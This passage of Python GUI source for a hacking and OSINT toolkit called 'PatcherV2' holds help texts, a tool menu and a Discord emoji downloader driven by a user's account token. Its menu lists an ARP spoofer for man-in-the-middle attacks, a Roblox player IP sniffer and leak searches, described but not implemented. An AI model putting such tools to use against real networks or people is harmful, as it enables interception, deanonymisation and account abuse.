                "Discover subdomains of a domain using brute-force or DNS enumeration techniques. Valuable in reconnaissance and attack surface mapping."
            ),
            "IP Checker": (
                "Display your current public IP address as seen by external services. Useful when testing VPNs, proxies, or internet exposure."
            ),
            "DNS Enumeration": (
                "Collect comprehensive DNS data such as SPF, DKIM, and NS records. Can uncover hidden services and internal infrastructure."
            ),
            "Network Interface": (
                "Show details of active network interfaces, including IPs, MACs, and interface status. Assists with diagnostics and configuration reviews."
            ),
            "Raw Packet Forge": (
                "Craft and send custom packets with control over headers and payloads. Useful for security testing, penetration testing, and education."
            ),
            "ARP Spoofer": (
                "Perform ARP spoofing to manipulate ARP tables in local networks. Demonstrates man-in-the-middle techniques for education and testing."
            ),
            "WiFi Network Viewer": (
                "Scan local Wi-Fi networks, showing SSIDs, signal strength, channels, and encryption. Great for site surveys or troubleshooting wireless coverage."
            ),
            "NetBIOS Scanner": (
                "Scan local networks for NetBIOS-enabled devices, revealing hostnames, shared folders, and user sessions. Useful for internal network audits."
            ),
            "Username Scanner": (
                "Check if a specific username exists across popular platforms like Instagram, Twitter, GitHub, etc. Effective for OSINT and threat identification."
            ),
            "Email Verifier": (
                "Verify email addresses for syntax, domain MX records, and mailbox presence. Helps clean contact lists and reduce bounce rates."
            ),
            "Metadata Extractor": (
                "Extract embedded metadata from files such as images (EXIF), PDFs, and documents. Reveals authorship, software used, timestamps, and more."
            ),
            "Phone Number Lookup": (
                "Retrieve the location, carrier, and timezone of a phone number. Assists in verification or profiling of communication details."
            ),
            "Pastebin Leak Search": (
                "Search public paste sites for leaked data like credentials, tokens, or personal information tied to your targets or organization."
            ),
            "Google Dorking Helper": (
                "Assist in crafting advanced Google search queries to uncover hidden files, vulnerable systems, or indexed sensitive data."
            ),

            "Embed Creator": (
                "Craft and send custom embedded messages to any Discord server using a webhook.\n\n"
                "This tool lets you design rich, stylized embeds with titles, descriptions, fields, colors, and more—"
                "then instantly send them to a channel via a valid Discord webhook URL.\n\n"
                "Perfect for bots, announcements, logs, or stylish message formatting without needing a bot token."
            ),

            "Emoji Downloader": (
                "Downloads all custom emojis from a selected Discord server.\n\n"
                "This tool allows you to easily save every custom emoji (static and animated) from any server you're in. "
                "You'll need to provide your Discord account token to authenticate and access the servers you belong to.\n\n"
                "[!] Note: Use responsibly. Sharing or using emojis from other servers without permission may violate Discord's Terms of Service."
            ),

            "Roblox Game IP Sniffer": (
                "Capture and analyze network traffic to extract IP addresses of players in active Roblox game sessions.\n\n"
                "• Useful for monitoring multiplayer connections in real-time.\n"
                "• Can help identify potential attackers, VPN usage, or multiple sessions.\n"
                "• Requires network sniffing privileges and proper filtering for Roblox traffic.\n"
                "• Intended for ethical research and analysis within legal boundaries."
            ),

            "Hash Generator": (
                "Create cryptographic hash values from any text input to verify data integrity or securely store sensitive data.\n\n"
                "• Supports MD5, SHA1, SHA256, and other algorithms.\n"
                "• Useful for password hashing, file checksums, and digital signatures.\n"
                "• One-way transformations — hashes cannot be reversed to original input."
            ),

            "Base64 Encoder/Decoder": (
                "Encode or decode data using Base64, a widely used binary-to-text encoding scheme.\n\n"
                "• Useful for embedding binary data in text formats (e.g., email, JSON).\n"
                "• Ensures safe transmission of data over media that only supports text.\n"
                "• Supports both encoding and decoding operations."
            ),

            "UUID Generator": (
                "Generate UUIDs (Universally Unique Identifiers) for identifying objects across systems without conflicts.\n\n"
                "• Supports multiple versions such as UUID4 (random).\n"
                "• Commonly used in databases, software development, and session tracking.\n"
                "• Ensures uniqueness across distributed systems or sessions."
            ),

            "Password Generator": (
                "Create strong, customizable passwords to enhance account security and reduce the risk of brute-force attacks.\n\n"
                "• Options for length, character types (letters, numbers, symbols).\n"
                "• Can exclude ambiguous characters (e.g., l vs 1, O vs 0).\n"
                "• Recommended for creating secure credentials for online accounts or databases."
            ),

            "Text Encoder/Decoder": (
                "Convert text between different character encodings such as UTF-8, ASCII, and others for compatibility.\n\n"
                "• Useful for web development, file processing, and internationalization.\n"
                "• Prevents character corruption in data transmission.\n"
                "• Includes both encode and decode capabilities with live preview."
            ),

            "Regex Tester": (
                "Test and debug regular expressions with instant feedback against sample text inputs.\n\n"
                "• Highlights matches, groups, and captures in real time.\n"
                "• Includes support for common regex flags (e.g., multiline, case-insensitive).\n"
                "• Helps developers write accurate and efficient pattern-matching expressions."
            ),


            "Firewalls and Ports": (
                "Understand how firewalls filter traffic based on port numbers and rules, helping protect systems from unauthorized access.\n\n"
                "\nWhat Is a Firewall?\n"
                "A firewall is a security system—hardware or software—that monitors and controls network traffic based on security rules. It blocks unauthorized access while allowing legitimate communication.\n\n"
                "\nTypes of Firewalls:\n"
                "- Packet-Filtering Firewall – Filters traffic based on IP, port, and protocol.\n"
                "- Stateful Inspection Firewall – Tracks connection states for smarter filtering.\n"
                "- Application Layer Firewall (Proxy Firewall) – Filters traffic at the application level.\n"
                "- Next-Gen Firewall (NGFW) – Adds intrusion prevention and deep packet inspection.\n"
                "- Host-based Firewall – Installed on individual systems (e.g., Windows Firewall).\n"
                "- Network-based Firewall – Hardware appliances for protecting entire networks.\n\n"
                "\nPort Categories:\n"
                "- Well-Known Ports: 0–1023\n"
                "- Registered Ports: 1024–49151\n"
                "- Dynamic/Private Ports: 49152–65535\n\n"
                "\nCommon Ports and Services:\n\n"
                "Port: Protocol: Service\n"
                "20: TCP: FTP (Data Transfer)\n"
                "21: TCP: FTP (Control)\n"
                "22: TCP: SSH (Secure Shell)\n"
                "23: TCP: Telnet\n"
                "25: TCP: SMTP (Email Sending)\n"
                "53: UDP/TCP: DNS\n"
                "67: UDP: DHCP (Server)\n"
                "68: UDP: DHCP (Client)\n"
                "69: UDP: TFTP\n"
                "80: TCP: HTTP (Web)\n"
                "110: TCP: POP3\n"
                "123: UDP: NTP (Time Sync)\n"
                "143: TCP: IMAP\n"
                "161: UDP: SNMP\n"
                "389: TCP/UDP: LDAP\n"
                "443: TCP: HTTPS (Secure Web)\n"
                "445: TCP: SMB (File Sharing)\n"
                "500: UDP: IKE (VPN/IPSec)\n"
                "514: UDP: Syslog\n"
                "587: TCP: SMTP (Secure)\n"
                "993: TCP: IMAPS\n"
                "995: TCP: POP3S\n"
                "1433: TCP: Microsoft SQL Server\n"
                "3306: TCP: MySQL\n"
                "3389: TCP: RDP (Remote Desktop)\n"
                "5060: UDP/TCP: SIP (VoIP)\n"
                "8080: TCP: HTTP Alternate / Proxy\n\n"
                "\nExample Firewall Rules:\n"
                "- Allow inbound TCP on port 22 from 192.168.1.5\n"
                "- Block all outbound traffic on port 23 (Telnet)"
            ),
            "Common Vulnerabilities": (
                "Learn about frequently exploited security weaknesses attackers use to compromise systems:\n\n"
                "• SQL Injection: Inserting malicious SQL code through input fields to manipulate databases.\n"
                "• Cross-Site Scripting (XSS): Injecting malicious scripts into web pages viewed by others.\n"
                "• Buffer Overflow: Overrunning memory buffers to execute arbitrary code or crash programs.\n"
                "• Weak Passwords: Easily guessable or reused passwords that allow unauthorized access.\n"
                "• Unpatched Software: Software missing security updates, vulnerable to known exploits.\n"
                "• Misconfigured Servers: Poor security settings exposing sensitive data or services.\n"
                "• Insecure Authentication: Weak login processes vulnerable to brute force or credential theft.\n\n"
                "Understanding these helps you identify and protect against common attack vectors."
            ),

            "Blacklist/Blocklists": (
                "Explore how blocklists (also called blacklists) help improve security by preventing connections to known malicious or untrusted IP addresses, domains, or URLs.\n\n"
                "• IP Blacklists: Lists of IP addresses flagged for spam, hacking, or abuse, used to block incoming or outgoing traffic.\n"
                "• Domain/URL Blocklists: Used to block websites known for phishing, malware, or other harmful activities.\n"
                "• Real-time Blackhole Lists (RBLs): Dynamic IP blacklists used by email servers to filter spam.\n"
                "• How Blocklists Work: Firewalls, email servers, and security tools check requests against blocklists and deny access if matches are found.\n"
                "• Limitations: Blocklists must be kept up-to-date and can sometimes block legitimate traffic (false positives).\n\n"
                "Using blocklists is a key layer in protecting networks from harmful traffic and improving overall security posture."
            ),

            "VPN and Proxy Basics": (
                "Get a clear overview of how VPNs and proxies protect your online identity and data:\n\n"
                "• VPN (Virtual Private Network):\n"
                "  - Encrypts your internet traffic and routes it through a secure server.\n"
                "  - Masks your real IP address, providing anonymity and privacy.\n"
                "  - Helps bypass geo-restrictions and censorship.\n"
                "  - Protects data on public Wi-Fi networks from eavesdropping.\n\n"
                "• Proxy Server:\n"
                "  - Acts as an intermediary between your device and the internet.\n"
                "  - Can hide your IP address but usually does not encrypt traffic.\n"
                "  - Commonly used for accessing geo-blocked content or controlling internet usage.\n\n"
                "• Differences:\n"
                "  - VPNs encrypt all traffic from your device; proxies typically only redirect specific traffic.\n"
                "  - VPNs offer stronger security and privacy compared to proxies.\n\n"
                "Understanding these tools is essential for maintaining privacy and security in network communications."
            ),

            "Most Used Ports": (
                "Familiarize yourself with common TCP/UDP ports and the services that typically run on them:\n\n"
                "• Port 20 & 21 (TCP): FTP — File Transfer Protocol for uploading and downloading files.\n"
                "• Port 22 (TCP): SSH — Secure Shell for encrypted remote login.\n"
                "• Port 23 (TCP): Telnet — Unencrypted remote terminal access (less secure).\n"
                "• Port 25 (TCP): SMTP — Sending email.\n"
                "• Port 53 (UDP/TCP): DNS — Domain Name System for resolving domain names.\n"
                "• Port 67 & 68 (UDP): DHCP — Dynamic Host Configuration Protocol for IP addressing.\n"
                "• Port 80 (TCP): HTTP — Web traffic.\n"
                "• Port 110 (TCP): POP3 — Email retrieval.\n"
                "• Port 143 (TCP): IMAP — Email retrieval with syncing.\n"
                "• Port 443 (TCP): HTTPS — Secure web traffic.\n"
                "• Port 3389 (TCP): RDP — Remote Desktop Protocol for Windows remote control.\n\n"
                "Knowing these helps in configuring firewalls, troubleshooting, and understanding network activity."
            ),

            "Service Mapping": (
                "Learn how tools like Nmap identify open ports on a target system and map those ports to the services running on them.\n\n"
                "• Port Scanning: Detects which ports are open or closed on a host.\n"
                "• Service Detection: Determines the application or service listening on each open port.\n"
                "• Version Detection: Some tools can identify software versions for better vulnerability assessment.\n"
                "• Enumeration: Mapping services helps in gathering information to plan further testing or attacks.\n\n"
                "Understanding service mapping is essential for effective network reconnaissance and security auditing."
            ),

            "Port Forwarding": (
                "Understand how port forwarding redirects incoming network traffic on specific ports to designated devices within a private network.\n\n"
                "• Purpose: Allows external devices to access services hosted on internal machines behind routers or firewalls.\n"
                "• How It Works: The router listens on a public port and forwards the traffic to a private IP and port inside the network.\n"
                "• Common Uses: Hosting game servers, remote desktop access, running web servers from home.\n"
                "• NAT (Network Address Translation): Port forwarding works alongside NAT to manage multiple devices using a single public IP.\n"
                "• Security Considerations: Improper port forwarding can expose internal systems to the internet, increasing risk.\n\n"
                "Knowing how to configure port forwarding is vital for managing network accessibility and security."
            ),

            "Toolkit Usage Guide": (
                "Under Development – This section will guide users through using each tool in the PatcherV2 toolkit effectively and safely."
            ),
        }



    def build_tree(self):
        # Clear any existing children
        self.tree.DeleteChildren(self.root)
        self.all_items = []

        def add_item(parent, label):
            item = self.tree.AppendItem(parent, label)
            self.all_items.append((item, label))
            return item

        ip_info = add_item(self.root, "IP Address Information")
        add_item(ip_info, "What is an IP Address?")
        add_item(ip_info, "Public vs Private IPs")
        add_item(ip_info, "Loopback and Reserved Addresses")
        add_item(ip_info, "What is NAT?")
        add_item(ip_info, "CIDR and Subnetting Basics")
        add_item(ip_info, "Known Public DNS Servers")
        add_item(ip_info, "DNS Resolution Process")

        toolkit_tools = add_item(self.root, "Toolkit Tools")

        network_tools = add_item(toolkit_tools, "Network Tools")
        add_item(network_tools, "IP Lookup")
        add_item(network_tools, "DNS Lookup")
        add_item(network_tools, "NSLookup")
        add_item(network_tools, "Port Scanner")
        add_item(network_tools, "Ping Tool")
        add_item(network_tools, "Traceroute")
        add_item(network_tools, "Subnet Calculator")
        add_item(network_tools, "MAC Address Lookup")
        add_item(network_tools, "Reverse IP Lookup")
        add_item(network_tools, "SSL/TLS Checker")
        add_item(network_tools, "HTTP Header Viewer")
        add_item(network_tools, "WHOIS Lookup")
        add_item(network_tools, "IP Blacklist Checker")
        add_item(network_tools, "Network Speed Test")
        add_item(network_tools, "Cloudflare Scanner")
        add_item(network_tools, "Host Monitor")
        add_item(network_tools, "Website2IP")
        add_item(network_tools, "Subdomain Scanner")
        add_item(network_tools, "IP Checker")
        add_item(network_tools, "DNS Enumeration")
        add_item(network_tools, "Network interface")
        add_item(network_tools, "Raw Packet Forge")
        add_item(network_tools, "ARP Spoofer")
        add_item(network_tools, "WiFi Network Viewer")
        add_item(network_tools, "NetBIOS Scanner")

        osint_tools = add_item(toolkit_tools, "OSINT Tools")
        add_item(osint_tools, "Username Scanner")
        add_item(osint_tools, "Email Verifier")
        add_item(osint_tools, "Metadata Extractor")
        add_item(osint_tools, "Phone Number Lookup")
        add_item(osint_tools, "Pastebin Leak Search")
        add_item(osint_tools, "Google Dorking Helper")

        discord_tools = add_item(toolkit_tools, "Discord Tools")
        add_item(discord_tools, "Embed Creator")
        add_item(discord_tools, "Emoji Downloader")

        misc_tools = add_item(toolkit_tools, "Miscellaneous Tools")
        add_item(misc_tools, "Roblox Game IP Sniffer")
        add_item(misc_tools, "Hash Generator")
        add_item(misc_tools, "Base64 Encoder/Decoder")
        add_item(misc_tools, "UUID Generator")
        add_item(misc_tools, "Password Generator")
        add_item(misc_tools, "Text Encoder/Decoder")
        add_item(misc_tools, "Regex Tester")

        security = add_item(self.root, "Security Concepts")
        add_item(security, "Firewalls and Ports")
        add_item(security, "Common Vulnerabilities")
        add_item(security, "Blacklist/Blocklists")
        add_item(security, "VPN and Proxy Basics")

        common_network_services = add_item(self.root, "Common Network Services & Ports")
        add_item(common_network_services, "Most Used Ports")
        add_item(common_network_services, "Service Mapping")
        add_item(common_network_services, "Port Forwarding")

        toolkit_usage = add_item(self.root, "Toolkit Usage Guide")

    def on_tree_selection(self, event):
        item = event.GetItem()
        if not item.IsOk():
            return
        label = self.tree.GetItemText(item)
        self.help_text.SetValue(f"You selected: {label}")

    def on_search(self, event):
        query = self.search_ctrl.GetValue().lower()
        self.tree.Freeze()
        self.tree.DeleteChildren(self.root)
        self.tree.CollapseAll()

        def add_filtered_items():
            # Add items that match the search query, along with their parents
            # For simplicity, just add all items that contain query in label
            def add_with_parents(item, label):
                # Check parents recursively
                parent = self.tree.GetItemParent(item)
                if parent and parent != self.root:
                    parent_label = self.tree.GetItemText(parent)
                    add_with_parents(parent, parent_label)
                if not self.tree.ItemHasChildren(item):
                    # Append leaf items matching query
                    self.tree.AppendItem(self.root, label)

            for item, label in self.all_items:
                if query in label.lower():
                    self.tree.AppendItem(self.root, label)

        if query == "":
            # If empty, rebuild full tree
            self.build_tree()
        else:
            # Filter the tree items by label
            # For simplicity just rebuild tree and hide non-matching leaves (flattened)
            self.tree.DeleteChildren(self.root)
            for item, label in self.all_items:
                if query in label.lower():
                    self.tree.AppendItem(self.root, label)

        self.tree.ExpandAll()
        self.tree.Thaw()

    def on_tree_selection(self, event):
        item = event.GetItem()
        label = self.tree.GetItemText(item)
        content = self.help_content.get(label, "Select a topic to view help information.")
        self.help_text.SetValue(content)


class EmojiDownloaderGUI(wx.Frame):
    def __init__(self, parent=None):
        super().__init__(parent, title="Emoji Downloader", size=(600, 400))
        panel = wx.Panel(self)
        vbox = wx.BoxSizer(wx.VERTICAL)

        # Token input
        hbox_token = wx.BoxSizer(wx.HORIZONTAL)
        hbox_token.Add(wx.StaticText(panel, label="User Token:"), 0, wx.ALL | wx.CENTER, 5)
        self.token_input = wx.TextCtrl(panel, style=wx.TE_PASSWORD)
        hbox_token.Add(self.token_input, 1, wx.ALL | wx.EXPAND, 5)
        self.load_button = wx.Button(panel, label="Load Servers")
        self.load_button.Bind(wx.EVT_BUTTON, self.load_servers)
        hbox_token.Add(self.load_button, 0, wx.ALL, 5)
        vbox.Add(hbox_token, 0, wx.EXPAND)

        # Server dropdown
        self.server_choice = wx.Choice(panel)
        self.server_choice.Bind(wx.EVT_CHOICE, self.on_server_selected)
        vbox.Add(self.server_choice, 0, wx.ALL | wx.EXPAND, 10)

        # Emoji list (wx.ListCtrl with images)
        self.emoji_list = wx.ListCtrl(panel, style=wx.LC_REPORT | wx.BORDER_SUNKEN)
        self.emoji_list.InsertColumn(0, "Emoji", width=50)
        self.emoji_list.InsertColumn(1, "Name", width=400)
        vbox.Add(self.emoji_list, 1, wx.ALL | wx.EXPAND, 10)

        # Image list for emoji previews
        self.image_list = wx.ImageList(32, 32)
        self.emoji_list.AssignImageList(self.image_list, wx.IMAGE_LIST_SMALL)

        # Download button
        self.download_button = wx.Button(panel, label="Download Selected Emojis")
        self.download_button.Bind(wx.EVT_BUTTON, self.download_emojis)
        vbox.Add(self.download_button, 0, wx.ALL | wx.CENTER, 10)

        panel.SetSizer(vbox)
        self.guilds = []
        self.emojis = []

        self.Center()
        self.Show()

    def load_servers(self, event):
        wx.MessageBox("If there are lots of emojis in a server this may take a long time!", "Warning!", wx.ICON_WARNING)
        token = self.token_input.GetValue()
        headers = {"Authorization": token}
        try:
            response = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
            if response.status_code != 200:
                wx.MessageBox("Failed to load servers. Invalid token?", "Error", wx.ICON_ERROR)
                return

            self.guilds = response.json()
            self.server_choice.Clear()
            self.server_choice.AppendItems([g["name"] for g in self.guilds])

        except Exception as e:
            wx.MessageBox(f"Error fetching servers:\n{e}", "Error", wx.ICON_ERROR)

    def on_server_selected(self, event):
        self.emoji_list.DeleteAllItems()
        self.image_list.RemoveAll()
        index = self.server_choice.GetSelection()
        if index == wx.NOT_FOUND:
            return
        guild_id = self.guilds[index]["id"]
        token = self.token_input.GetValue()
        headers = {"Authorization": token}
        try:
            emoji_resp = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/emojis", headers=headers)
            if emoji_resp.status_code == 200:
                self.emojis = emoji_resp.json()
                for i, e in enumerate(self.emojis):
                    name = e['name']
                    animated = e.get('animated', False)
                    ext = "gif" if animated else "png"
                    url = f"https://cdn.discordapp.com/emojis/{e['id']}.{ext}"

                    # Download emoji image and add to imagelist
                    try:
                        img_data = requests.get(url).content
                        stream = io.BytesIO(img_data)
                        img = wx.Image(stream)
                        img = img.Scale(32, 32, wx.IMAGE_QUALITY_HIGH)
                        bmp = wx.Bitmap(img)
                        image_index = self.image_list.Add(bmp)
                    except Exception:
                        image_index = -1

                    # Insert list item with image
                    idx = self.emoji_list.InsertItem(i, "", image_index)
                    self.emoji_list.SetItem(idx, 1, f"{name} ({'Animated' if animated else 'Static'})")
            else:
                wx.MessageBox("Failed to fetch emojis.", "Error", wx.ICON_ERROR)
        except Exception as e:
            wx.MessageBox(f"Error fetching emojis:\n{e}", "Error", wx.ICON_ERROR)

    def download_emojis(self, event):
        selected = []
        current = -1
        while True:
            current = self.emoji_list.GetNextItem(current, wx.LIST_NEXT_ALL, wx.LIST_STATE_SELECTED)
            if current == -1:
                break
            selected.append(current)

        if not selected:
            wx.MessageBox("Select emojis to download.", "Info", wx.ICON_INFORMATION)
            return

        os.makedirs("downloaded_emojis", exist_ok=True)
        for i in selected:
            emoji = self.emojis[i]
            ext = "gif" if emoji.get("animated", False) else "png"
            url = f"https://cdn.discordapp.com/emojis/{emoji['id']}.{ext}"
            filename = f"downloaded_emojis/{emoji['name']}.{ext}"
            try:
                r = requests.get(url)
                if r.status_code == 200:
                    with open(filename, "wb") as f:
                        f.write(r.content)
            except Exception as e:
                print(f"Failed to download {emoji['name']}: {e}")

        wx.MessageBox("Download complete.", "Success")

































class ToolkitFrame(wx.Frame):
    def __init__(self):
        super().__init__(None, title="PatcherV2", size=(1000, 600))

        self.create_menu_bar()

        splitter = wx.SplitterWindow(self)
        self.sidebar = wx.TreeCtrl(splitter, style=wx.TR_HAS_BUTTONS | wx.TR_LINES_AT_ROOT)

        self.content_panel = wx.Panel(splitter)
        self.content_sizer = wx.BoxSizer(wx.VERTICAL)
        self.content_panel.SetSizer(self.content_sizer)

        splitter.SplitVertically(self.sidebar, self.content_panel, 200)
        splitter.SetMinimumPaneSize(150)

        self.statusbar = self.CreateStatusBar()
        self.statusbar.SetStatusText("Hover over a tool to see its description...")

        self.create_sidebar_tree()

        self.Bind(wx.EVT_TREE_SEL_CHANGED, self.on_tool_selected, self.sidebar)
        self.sidebar.Bind(wx.EVT_MOTION, self.on_mouse_move)

        self.tool_descriptions = {
            "IP Lookup": "Get info like geolocation and WHOIS for IP addresses.",
            "DNS Lookup": "Resolve domains to IP addresses via DNS records.",
            "NSLookup": "Query DNS name servers for detailed domain data.",
            "Port Scanner": "Scan open ports on a target IP or domain. (basic TCP SYN scan)",
            "Ping Tool": "Send ICMP pings, measure latency and packet loss.",
            "Traceroute": "Show the route packets take to reach a destination IP/domain.",
            "Subnet Calculator": "Calculate subnet ranges, broadcast addresses, number of hosts.",
            "MAC Address Lookup": "Lookup vendor info from MAC addresses.",
            "Reverse IP Lookup": "Find domains hosted on the same IP address.",
            "SSL/TLS Checker": "Check the SSL certificate details of a website. (expiration, issuer, etc.)",
            "HTTP Header Viewer": "Show HTTP headers from a web server.",
            "WHOIS Lookup": "Get domain registration details.",
            "IP Blacklist Checker": "Check if an IP is listed on popular spam or threat blacklists.",
            "Cloudflare Scanner": "Checks if a website has cloudflare DDoS protection.",
            "Website2IP": "Grabs a websites IP address.",
            "Subdomain Scanner": "Scans a website for subdomains.",
            "IP Checker": "Check an IP Address to see if its related to any government domains or servers.",
            "IP Range Scanner": "Check a range of IPs and see what ones are online.",

            # Osint Tools
            "Username Scanner": "Scan social platforms for a given username.",
            "Email Verifier": "Verify if an email address is active or exists.",
            "Metadata Extractor": "Extracts data that is hidden inside of a file.",
            "Phone Number Lookup": "Looks up information on a phone number.",
            "Pastebin Leak Search": "Scans pastebin for pastes for leaks.",
            "DNS Enumeration": "Enumates DNS's for DNS records.",
            "Google Dorking Helper": "Makes google dorking easier.",

            # Discord Tools
            "Embed Creator": "Using a webhook send embeded messages in a discord server. (Webhook required)",

            # Misc Tools
            "Roblox Game IP Sniffer": "Grabs your Roblox game IP address.",
            "Hash Generator": "Generate hashes (MD5, SHA-1, SHA-256, SHA-512) for any input text.",
            "Base64 Encoder/Decoder": "Encode or decode strings using Base64 encoding.",
            "UUID Generator": "Create universally unique identifiers (UUIDs) in multiple formats.",
            "Password Generator": "Generate strong, customizable passwords with letters, numbers, and symbols.",
            "Text Encoder/Decoder": "Encode or decode text using URL encoding, HTML entities, and more.",
            "Regex Tester": "Test and debug regular expressions against sample text with instant results.",
            "Fake Identity Generator": "Generate a completely made up identity.",
            "URL Scanner": "Scan a URL for suspicious activity",


            "Network interface": "Shows private wifi information. [SENSITIVE DATA WARNING!]",
            "Raw Packet Forge": "Create TCP or UDP packets and send them.",
            "ARP Spoofer": "Intercept and manipulate network traffic between devices by sending forged ARP packets, enabling man-in-the-middle (MITM) attacks on local networks.",
            "WiFi Network Viewer": "Scan and display nearby Wi-Fi networks along with their SSID, signal strength, channel, encryption type, and MAC address.",
            "NetBIOS Scanner": "Scan a local IP range for active hosts using NetBIOS, retrieving device names, IP addresses, and optional MAC addresses.",


            # Database viewer:
            "Database": "View your saved CSV database.",
        }

        self.tool_panels = {}

    def create_menu_bar(self):
        # --- Menu bar setup ---
        menubar = wx.MenuBar()
        
        about_menu = wx.Menu()
        options_item = about_menu.Append(wx.ID_SAVEAS, "Options")
        about_item = about_menu.Append(wx.ID_SAVE, "About")
        help_item = about_menu.Append(wx.ID_SAVE, "Help")

        self.Bind(wx.EVT_MENU, self.on_open_options, options_item)
        self.Bind(wx.EVT_MENU, self.on_open_about, about_item)
        self.Bind(wx.EVT_MENU, self.on_help_clicked, help_item)


        menubar.Append(about_menu, "&Help")
        self.SetMenuBar(menubar)

        # --- Toolbar setup (adds icon button at top) ---
        toolbar = self.CreateToolBar()
        terminal_icon = wx.Bitmap("icons/terminal_icon.png", wx.BITMAP_TYPE_PNG)
        Putty_icon = wx.Bitmap("icons/PuTTY.png", wx.BITMAP_TYPE_PNG)
        wireshark_icon = wx.Bitmap("icons/wireshark.png", wx.BITMAP_TYPE_PNG)
        obfuscator_tool_icon = wx.Bitmap("icons/brick.png", wx.BITMAP_TYPE_PNG)
        bricks_icon = wx.Bitmap("icons/bricks.png", wx.BITMAP_TYPE_PNG)
        emoji_icon = wx.Bitmap("icons/emoticon_smile.png", wx.BITMAP_TYPE_PNG)

        terminal_tool = toolbar.AddTool(wx.ID_ANY, "Terminal", terminal_icon, shortHelp="Open Terminal")
        self.Bind(wx.EVT_TOOL, self.on_terminal_clicked, terminal_tool)

        putty_tool = toolbar.AddTool(wx.ID_ANY, "Putty", Putty_icon, shortHelp="Open PuTTY (If installed)")
        self.Bind(wx.EVT_TOOL, self.on_putty_clicked, putty_tool)

        emoji_tool = toolbar.AddTool(wx.ID_ANY, "Discord Server Emoji Stealer", emoji_icon, shortHelp="Opens Discord Server Emoji Stealer")
        self.Bind(wx.EVT_TOOL, self.on_emoji_clicked, emoji_tool)

        wire_shark_tool = toolbar.AddTool(wx.ID_ANY, "Wireshark", wireshark_icon, shortHelp="Opens Wireshark (If installed)")
        self.Bind(wx.EVT_TOOL, self.on_wireshark_clicked, wire_shark_tool)

        obfuscator_tool = toolbar.AddTool(wx.ID_ANY, "Obfuscator", obfuscator_tool_icon, shortHelp="Opens the Obfuscator tool")
        self.Bind(wx.EVT_TOOL, self.on_obfuscator_clicked, obfuscator_tool)

        bricks_tool = toolbar.AddTool(wx.ID_ANY, "IP Monitor", bricks_icon, shortHelp="Opens the IP Monitor tool")
        self.Bind(wx.EVT_TOOL, self.on_ip_monitor_tool_clicked, bricks_tool)

        toolbar.Realize()
#on_emoji_clicked
    def on_help_clicked(self, event):
        if not hasattr(self, 'HelpWindow') or self.HelpWindow is None or not self.HelpWindow.IsShown():
            self.HelpWindow = HelpWindow(self)
            self.HelpWindow.Bind(wx.EVT_CLOSE, self.on_help_window_close)
        self.HelpWindow.Show()
        self.HelpWindow.Raise()

    def on_help_window_close(self, event):
        self.HelpWindow.Destroy()
        self.HelpWindow = None
        event.Skip()

    def on_terminal_clicked(self, event):
        subprocess.Popen("start cmd", shell=True)

    def on_wireshark_clicked(self, event):
        possible_paths = [
            r"C:\Program Files\Wireshark\Wireshark.exe",
            r"C:\Program Files (x86)\Wireshark\Wireshark.exe"
        ]

        for path in possible_paths:
            if os.path.exists(path):
                subprocess.Popen([path])
                return

        wx.MessageBox("Wireshark not found. Please ensure it is installed.", "Error", wx.OK | wx.ICON_ERROR)

    def on_putty_clicked(self, event):
        possible_paths = [
            r"C:\Program Files\PuTTY\putty.exe",
            r"C:\Program Files (x86)\PuTTY\putty.exe"
        ]

        for path in possible_paths:
            if os.path.exists(path):
                subprocess.Popen([path])
                return

        wx.MessageBox("PuTTY not found. Please make sure it is installed.", "Error", wx.OK | wx.ICON_ERROR)

    def on_emoji_clicked(self, event):
        if not hasattr(self, 'EmojiDownloaderGUI') or self.EmojiDownloaderGUI is None or not self.EmojiDownloaderGUI.IsShown():
            self.EmojiDownloaderGUI = EmojiDownloaderGUI(self)
            self.EmojiDownloaderGUI.Bind(wx.EVT_CLOSE, self.on_emoji_close)
        self.EmojiDownloaderGUI.Show()
        self.EmojiDownloaderGUI.Raise()

    def on_emoji_close(self, event):
        self.EmojiDownloaderGUI.Destroy()
        self.EmojiDownloaderGUI = None
        event.Skip()

    def on_obfuscator_clicked(self, event):
        if not hasattr(self, 'FileObfuscatorGUI') or self.FileObfuscatorGUI is None or not self.FileObfuscatorGUI.IsShown():
            self.FileObfuscatorGUI = FileObfuscatorGUI(self)
            self.FileObfuscatorGUI.Bind(wx.EVT_CLOSE, self.on_file_obfuscator_close)
        self.FileObfuscatorGUI.Show()
        self.FileObfuscatorGUI.Raise()

    def on_file_obfuscator_close(self, event):
        # Clear the reference so next time we create a fresh window
        self.FileObfuscatorGUI.Destroy()
        self.FileObfuscatorGUI = None
        event.Skip()

    def on_ip_monitor_tool_clicked(self, event):
        if not hasattr(self, 'IPMonitorPopup') or self.IPMonitorPopup is None or not self.IPMonitorPopup.IsShown():
            self.IPMonitorPopup = IPMonitorPopup(self)
            self.IPMonitorPopup.Bind(wx.EVT_CLOSE, self.on_ip_monitor_tool_close)
        self.IPMonitorPopup.Show()
        self.IPMonitorPopup.Raise()
    def on_ip_monitor_tool_close(self, event):
        # Clear the reference so next time we create a fresh window
        self.IPMonitorPopup.Destroy()
        self.IPMonitorPopup = None
        event.Skip()

    def on_open_about(self, event):
        dlg = wx.MessageDialog(self, 
            "PatcherV2 v1.0\nCreated by BanRioT\n© 2025", 
            "About", wx.OK | wx.ICON_INFORMATION)
        dlg.ShowModal()
        dlg.Destroy()

    def on_open_options(self, event):
        dlg = wx.Dialog(self, title="Options", size=(300, 200))
        panel = wx.Panel(dlg)
        sizer = wx.BoxSizer(wx.VERTICAL)

        sizer.Add(wx.StaticText(panel, label="Settings placeholder."), 0, wx.ALL | wx.CENTER, 10)
        close_button = wx.Button(panel, label="Close")
        close_button.Bind(wx.EVT_BUTTON, lambda e: dlg.Close())
        sizer.Add(close_button, 0, wx.ALL | wx.CENTER, 10)

        panel.SetSizer(sizer)
        dlg.ShowModal()
        dlg.Destroy()


    def create_sidebar_tree(self):

        self.image_list = wx.ImageList(16, 16)
        self.sidebar.AssignImageList(self.image_list)

        ip_icon = self.image_list.Add(wx.Bitmap("icons/connect.png", wx.BITMAP_TYPE_PNG))
        tools_icon = self.image_list.Add(wx.Bitmap("icons/wrench.png", wx.BITMAP_TYPE_PNG))
        magnifier_icon = self.image_list.Add(wx.Bitmap("icons/magnifier.png", wx.BITMAP_TYPE_PNG))
        wand_icon = self.image_list.Add(wx.Bitmap("icons/wand.png", wx.BITMAP_TYPE_PNG))
